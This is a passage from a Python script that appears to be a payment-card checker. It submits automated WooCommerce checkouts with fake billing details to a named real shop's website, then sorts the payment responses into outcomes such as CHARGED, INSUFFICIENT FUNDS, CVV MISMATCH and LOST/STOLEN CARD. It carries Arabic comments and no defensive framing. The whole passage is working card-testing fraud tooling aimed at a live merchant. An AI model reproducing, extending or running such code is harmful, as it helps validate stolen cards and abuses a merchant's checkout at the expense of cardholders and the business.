"+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&billing_email={fake_data["email"]}&order_comments=&payment_method=woocommerce_payments&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wcpay-payment-method={payment_method_id}&wcpay-fingerprint={fraud_token}&wcpay-fraud-prevention-token='
    
    response = r.post('https://axel-wehning.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    print(f"[7/7] Final checkout status: {response.status_code}")
    
    # ================ 8. PARSE RESULT ================
    print("\n[8/8] Parsing result...")
    
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
        print(f"[8/8] Response JSON: {json.dumps(result_data, indent=2)[:500]}")
    except:
        print(f"[8/8] Raw response: {response.text[:500]}")
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
    
    # ==================== ردود Stripe الكاملة والمفصلة ====================
    
    success_keywords = ['charged', 'success', 'completed', 'approved', 'payment successful', 'order received', 
                        'thank you for your order', 'order confirmed', 'transaction approved', 'payment completed',
                        'payment succeeded', 'charge succeeded']
    if any(keyword in search_text for keyword in success_keywords):
        return 'CHARGED'
    
    # بطاقة غير صالحة
    if 'your card number is incorrect' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD NUMBER'
    
    # رصيد غير كافٍ
    if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    # بطاقة منتهية
    if 'expired card' in search_text or 'card expired' in search_text or 'expired' in search_text:
        return 'EXPIRED CARD'
    
    # CVV خطأ
    if 'cvv' in search_text or 'cvv verification failed' in search_text or 'incorrect cvc' in search_text:
        return 'CVV MISMATCH'
    
    # Do Not Honor
    if 'do not honor' in search_text or 'do_not_honor' in search_text:
        return 'DO NOT HONOR'
    
    # احتيال
    if 'fraud' in search_text or 'suspected fraud' in search_text or 'risk' in search_text:
        return 'SUSPECTED FRAUD'
    
    # 3D Secure مطلوب
    if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text or 'challenge required' in search_text:
        return '3D SECURE REQUIRED'
    
    # عملية غير مسموحة
    if 'transaction not allowed' in search_text or 'transaction_not_permitted' in search_text:
        return 'TRANSACTION NOT ALLOWED'
    
    # تم الرفض
    if 'your card has been declined' in search_text or 'card declined' in search_text:
        return 'DECLINED'
    
    # خطأ في المعالجة
    if 'processing error' in search_text or 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    # بطاقة مفقودة أو مسروقة
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    # تجاوز الحد
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    # عنوان غير مطابق
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    # أي سبب تاني من الـ Reason
    if reason and len(reason) < 50:
        return reason.upper()
    
    if clean_messages and len(clean_messages) < 100:
        return clean_messages.title()
    
    if 'declined' in search_text:
        return 'DECLINED'
    
    return 'DECLINED'